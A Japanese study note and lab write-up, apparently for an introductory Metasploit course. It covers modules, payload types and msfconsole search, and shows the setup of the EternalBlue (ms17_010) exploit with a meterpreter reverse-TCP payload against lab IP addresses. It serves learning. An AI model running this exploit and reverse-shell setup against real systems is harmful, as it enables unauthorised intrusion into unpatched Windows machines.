metasploit framework

metasploit consoleからから使用  
脆弱性の攻撃  
ターゲットのスキャン  
ブルートフォース攻撃の実行  

ターゲットシステム上に存在する脆弱性の一部、これをエクスプロイト  
ペイロードは脆弱性の利用  
ペイロードはターゲットシステム上で実行されるコード  
機密情報の読み取り等、エクスプロイトして得たい結果次第  

## metasploit framework module  
--- 
metasploitframework自体は,
/optにある  
moduleの確認  
kali はdefaultでtreeコマンド入ってないよ  

```
/opt/metasploit-framework-5101/modules
```

大体、defaultではここに入ってるっぽい  
<br>
エンコーダーはセキュリティソフト対策  
<br>
metasploitはターゲット上のシステムのシェルを開くペイロードをデフォルトで備えている。   
<br>
## payloadの種類  
---  
シングル： 自己完結型のペイロードで、追加コンポーネントをダウンロードする必要なし  
<br>

# write up    
<br>

## Metasploit: Introduction
###  Task 2  Main Components of Metasploit
Is "windows/x64/pingback_reverse_tcp" among singles or staged payload?

```
// 移動後
find payloads/ -name "*pingback_reverse_tcp*"
```
```
payloads/singles/windows/pingback_reverse_tcp.rb
payloads/singles/windows/x64/pingback_reverse_tcp.rb
payloads/singles/linux/x64/pingback_reverse_tcp.rb
payloads/singles/ruby/pingback_reverse_tcp.rb
payloads/singles/python/pingback_reverse_tcp.rb
```  
<br>

### Task 3  Msfconsole  
metasploit frameworkのインターフェイスはmsfconsole  
```
msfconsole
```  
コマンドで起動可能  
<br>
msfconsoleで最も便利なコマンドはsearch、  
metasploitのデータベース検索用  
指定された検索パラメータに関するモジュール  
cve エクスプロイト名  
```
// エクスプロイト名で検索
// クロスサイトスクリプション
search xss
// shellcode injection
search "shellcode injection"
```  
<br>
<br>

### Task 4  Working with modules
---  
<br>  
exploitするmoduleをセット  

```
// useで使用するmoduleを設定
use exploit/windows/smb/ms17_010_eternalblue
//victim addressを設定
set rhotes <victim address>
```
<br>

```
Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS         10.10.32.29      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.58.20      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs

```

* RHOSTS: ターゲット・システムのIPアドレス。  
ネットワーク範囲を設定することもできる。  

* RPORT: リモートポート。脆弱なアプリが動いているターゲットシステムのポート  

* PAYLOAD: エクスプロイトで使用。  

* LHOST: 攻撃元のIP。  

* LPORT: リバースシェルが接続し直すために使用するポート。  
他のアプリが使用しない任意のポートに設定する。  

* SESSION: Metasploitを使用してターゲットシステムに確立された各接続は、セッションIDをもつ。  
これは、既存の接続を使用して、ターゲットシステムに接続するポストエクスプロイトモジュールで使用する。  
<br>
<br>
パラメータを設定したので、exploitコマンドを起動する。  
zコマンドをつけると、セッションをバックグラウンド。  


<br>

* dnsとか見つけたい。  
udpサービスとかをみるとよい？
metasploitはこれを行うのに優れたものを提供している。  
